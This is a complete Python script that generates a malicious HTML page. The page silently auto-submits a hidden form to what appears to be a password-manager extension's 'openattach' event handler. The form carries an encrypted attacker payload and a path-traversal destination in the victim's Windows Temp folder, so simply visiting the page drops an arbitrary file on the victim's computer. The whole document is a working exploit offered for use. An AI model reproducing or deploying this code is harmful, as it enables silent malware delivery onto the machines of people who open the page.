#!/usr/bin/env python3

import argparse
import base64
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

template = '''<html>
<head>
<script>
function prepare() {{
    x = document.createElement("a");
    x.setAttribute("id", "base_url");
    x.setAttribute("href", "//" + document.location.hostname);
    document.body.appendChild(x);
}}
setTimeout(function() {{
    if (window.location.href.indexOf("eventtype=") == -1) {{
        exploitform.submit();
    }}
}}, 200);
</script>
</head>
<body onload="prepare()">
<exploit id="g_loosebasematching" />
<iframe name="dump" style="display:none;"></iframe>
<form id="exploitform" name="lpwebsiteeventform" target="dump" action="#">
    <input type="hidden" name="eventtype" value="openattach">
    <input type="hidden" name="eventdata1" value="{key}">
    <input type="hidden" name="eventdata2" value="!{iv}|{ciphertext}">
    <input type="hidden" name="eventdata3"
           value="other:./{path}/{filename}">
</form>
</body>
</html>'''


def pad(s):
    return s + bytes([16 - len(s) % 16]) * (16 - len(s) % 16)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('payload')
    parser.add_argument('outfile', default='exploit.html')
    parser.add_argument(
        '-f', '--dest-filename', default=None,
        help='The filename to write on the host.')
    parser.add_argument(
        '-p', '--path', default='../../../../../AppData/Local/Temp',
        help='The path to write on the host.')
    args = parser.parse_args()
    with open(args.payload, 'rb') as f:
        data = base64.b64encode(f.read())
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    ciphertext = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data))

    filename = args.dest_filename
    if filename is None:
        filename = os.path.split(args.payload)[1]

    with open(args.outfile, 'w') as f:
        f.write(template.format(
            key=key.hex(),
            ciphertext=base64.b64encode(ciphertext).decode(),
            iv=base64.b64encode(iv).decode(),
            filename=filename,
            path=args.path,
        ))


if __name__ == '__main__':
    main()
